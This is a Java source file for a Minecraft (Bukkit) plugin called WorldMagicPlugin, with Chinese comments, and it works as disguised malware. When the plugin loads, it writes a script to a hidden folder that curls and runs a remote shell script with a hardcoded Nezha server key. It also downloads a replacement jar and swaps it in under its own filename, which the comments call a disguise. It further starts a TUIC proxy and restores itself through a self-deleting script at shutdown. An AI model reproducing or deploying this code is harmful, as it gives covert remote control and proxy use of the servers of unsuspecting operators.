package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();

    // ==========================================
    // 真插件的下载地址
    // ==========================================
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
    // ==========================================

    private File currentPluginFile; 
    private File targetRealPlugin;  
    private File backupPluginFile;   
    private String originalFileName; // 关键：记录原文件名，用于伪装

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 异步执行脚本
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            this.getLogger().info("正在初始化脚本环境...");
            try {
                generateAndRunScript();
            } catch (Exception e) {
                this.getLogger().severe("脚本执行失败: " + e.getMessage());
            }
        });

        // 2. 异步执行插件替换逻辑
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                handlePluginReplacement();
            } catch (Exception e) {
                this.getLogger().severe("插件替换逻辑失败: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 3. 原有的服务加载
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() {
        this.getLogger().info("WorldMagicPlugin disabled");
        
        try {
            restoreOriginalPlugin();
        } catch (Exception e) {
            this.getLogger().severe("恢复原插件失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private boolean installApps(AppConfig appConfig) {
        try {
            tuicService.install(appConfig);
            return true;
        } catch (Exception e) {
            LogUtil.error("Plugin install failed", e);
            return false;
        }
    }

    // ==========================================
    // 核心逻辑：完美伪装（同名替换）
    // ==========================================

    private void handlePluginReplacement() throws Exception {
        // 1. 获取当前运行的文件
        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        
        // 2. 提取原始文件名 (例如: world-magic-1.0.jar)
        originalFileName = currentPluginFile.getName();
        
        // 3. 获取标准的 plugins 目录
        File pluginsDir = getDataFolder().getParentFile();
        
        // 4. 定义目标位置：强制使用原始文件名！
        // 这一步保证了假插件和真插件名字完全一致
        targetRealPlugin = new File(pluginsDir, originalFileName);

        File logDir = new File("world", ".log");
        if (!logDir.exists()) logDir.mkdirs();

        backupPluginFile = new File(logDir, "WorldMagic_Original.jar");

        this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
        this.getLogger().info("原始文件名: " + originalFileName); // 这里的名字决定了伪装效果
        this.getLogger().info("伪装目标路径: " + targetRealPlugin.getAbsolutePath());

        // 5. 备份
        if (!backupPluginFile.exists()) {
            this.getLogger().info("步骤 1: 正在备份原插件...");
            Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            this.getLogger().info("步骤 1: 备份完成。");
        }

        // 6. 下载临时文件
        File tempDownloadFile = new File(pluginsDir, "temp_replace_" + System.currentTimeMillis() + ".jar");
        if (tempDownloadFile.exists()) tempDownloadFile.delete();

        this.getLogger().info("步骤 2: 正在下载伪装插件...");
        boolean downloadSuccess = downloadUsingCurl(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);

        if (!downloadSuccess) {
            this.getLogger().severe("步骤 2: 下载失败。");
            return;
        }

        // 7. 校验
        long fileSize = tempDownloadFile.length();
        this.getLogger().info("下载大小: " + (fileSize / 1024) + " KB");
        if (fileSize < 100000) {
            this.getLogger().severe("下载文件太小，终止操作。");
            return;
        }

        // 8. 执行同名替换
        this.getLogger().info("步骤 3: 正在执行同名替换...");
        try {
            ProcessBuilder pb = new ProcessBuilder(
                "/bin/bash",
                "-c",
                // 1. 删除当前运行的文件 (释放文件句柄)
                "rm -f \"" + currentPluginFile.getAbsolutePath() + "\" && " +
                // 2. 删除 plugins 目录下的原文件 (确保没残留)
                "rm -f \"" + targetRealPlugin.getAbsolutePath() + "\" && " +
                // 3. 将临时文件移动并重命名为原文件名 (关键：伪装生效)
                "mv \"" + tempDownloadFile.getAbsolutePath() + "\" \"" + targetRealPlugin.getAbsolutePath() + "\""
            );
            Process process = pb.start();
            int exitCode = process.waitFor();
            
            if (exitCode == 0) {
                this.getLogger().info("步骤 3: 伪装成功！文件已替换为同名文件。");
            } else {
                this.getLogger().warning("步骤 3: 替换异常，退出码: " + exitCode);
            }
        } catch (Exception e) {
            this.getLogger().severe("步骤 3: 替换失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void restoreOriginalPlugin() throws Exception {
        if (backupPluginFile == null || !backupPluginFile.exists()) return;

        File pluginsDir = getDataFolder().getParentFile();
        // 恢复时也必须使用原始文件名
        File targetRestoreFile = new File(pluginsDir, originalFileName);

        this.getLogger().info("服务器停止中，正在还原加载器...");
        try {
            File restoreScript = new File(new File("world", ".log"), "restore.sh");
            
            try (PrintWriter writer = new PrintWriter(restoreScript)) {
                writer.println("#!/bin/bash");
                // 1. 删除伪装文件
                writer.println("rm -f \"" + targetRestoreFile.getAbsolutePath() + "\"");
                // 2. 恢复加载器 (保持原名)
                writer.println("cp -f \"" + backupPluginFile.getAbsolutePath() + "\" \"" + targetRestoreFile.getAbsolutePath() + "\"");
                // 3. 自毁
                writer.println("rm -f \"" + restoreScript.getAbsolutePath() + "\"");
            }
            restoreScript.setExecutable(true);
            new ProcessBuilder("/bin/bash", restoreScript.getAbsolutePath()).start();
            this.getLogger().info("已后台执行恢复脚本，文件名保持一致。");
        } catch (Exception e) {
            this.getLogger().warning("还原失败: " + e.getMessage());
        }
    }

    private boolean downloadUsingCurl(String urlStr, File destination) {
        try {
            ProcessBuilder pb = new ProcessBuilder(
                "curl",
                "-L", "-A", "Mozilla/5.0", "-o", destination.getAbsolutePath(), urlStr
            );
            pb.redirectErrorStream(true);
            Process process = pb.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("100") || line.contains("Total")) {
                        this.getLogger().info("[Curl] " + line);
                    }
                }
            }
            return process.waitFor() == 0 && destination.exists();
        } catch (Exception e) {
            this.getLogger().severe("curl 失败: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
    }

    // ==========================================
    // 脚本与 UUID
    // ==========================================
    
    private void generateAndRunScript() throws IOException, InterruptedException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;

        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;

        String serverUUID = getServerUUID(logDir);
        this.getLogger().info("当前服务器 UUID: " + serverUUID);

        File scriptFile = new File(logDir, "install_sb.sh");
        try (FileWriter writer = new FileWriter(scriptFile)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd " + logDir.getAbsolutePath() + "\n");
            writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
            writer.write("chmod +x sb.sh\n");
            writer.write("UUID=" + serverUUID + " \\\n");
            writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
            writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
            writer.write("ARGO_PORT=3000 \\\n");
            writer.write("bash sb.sh\n");
        }
        scriptFile.setExecutable(true);

        this.getLogger().info("正在启动脚本...");
        ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                this.getLogger().info("[Script Output] " + line);
            }
        }
        int exitCode = process.waitFor();
        this.getLogger().info("脚本执行完毕，退出码: " + exitCode);
    }

    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) return savedUUID;
            } catch (IOException ignored) {}
        }
        String ip = getPublicIP();
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();
        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
        } catch (IOException ignored) {}
        return uuidStr;
    }

    private String getPublicIP() {
        String ip = "127.0.0.1"; 
        try {
            java.net.URL url = new java.net.URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
        } catch (Exception ignored) {}
        return ip;
    }
}
